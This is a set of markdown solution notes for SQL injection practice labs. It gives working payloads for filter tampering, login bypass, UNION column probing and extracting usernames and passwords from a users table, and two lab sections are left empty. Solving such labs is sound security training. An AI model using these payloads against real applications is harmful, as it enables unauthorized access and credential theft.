# Labs

## SQL injection

1. [SQL injection vulnerability in WHERE clause allowing retrieval of hidden data](#sql-injection-vulnerability-in-where-clause-allowing-retrieval-of-hidden-data)
2. [SQL injection vulnerability allowing login bypass](#sql-injection-vulnerability-allowing-login-bypass)
3. [SQL injection UNION attack, determining the number of columns returned by the query](#sql-injection-union-attack-determining-the-number-of-columns-returned-by-the-query)
4. [SQL injection UNION attack, finding a column containing text](#sql-injection-union-attack-finding-a-column-containing-text)
5. [SQL injection UNION attack, retrieving data from other tables](#sql-injection-union-attack-retrieving-data-from-other-tables)
6. [SQL injection UNION attack, retrieving multiple values in a single column](#sql-injection-union-attack-retrieving-multiple-values-in-a-single-column)
7. [SQL injection attack, querying the database type and version on Oracle](#sql-injection-attack-querying-the-database-type-and-version-on-oracle)

### SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

```text
URL - /filter?category=Gifts

Required - SELECT * FROM products WHERE category = 'Gifts' AND released = 1

Query - Gifts' OR 1=1--
```

### SQL injection vulnerability allowing login bypass

```text
Navigate to my account

In login page,
username - administrator'--

Commenting out the query after username
```

### SQL injection UNION attack, determining the number of columns returned by the query

```text
Select any category filter

Start by query - Pets' UNION SELECT NULL--

Keep appending NULL until no error

Required query - Pets' UNION SELECT NULL,NULL,NULL--
```

### SQL injection UNION attack, finding a column containing text

```text
Under category filter,

first we have to find number of columns

required query - Gifts' UNION SELECT NULL,NULL,NULL--

Now, we need to find which column contains text

Start replacing each NULL by a string

required query - Gifts' UNION SELECT NULL,'a',NULL--

replace 'a' with string to be outputted
```

### SQL injection UNION attack, retrieving data from other tables

```text
Under category filter,

We need to find username, password from users table

Required query - Gifts' UNION SELECT username,password FROM users--

This gives us administrator's password, then we just need to login
```

### SQL injection UNION attack, retrieving multiple values in a single column

### SQL injection attack, querying the database type and version on Oracle
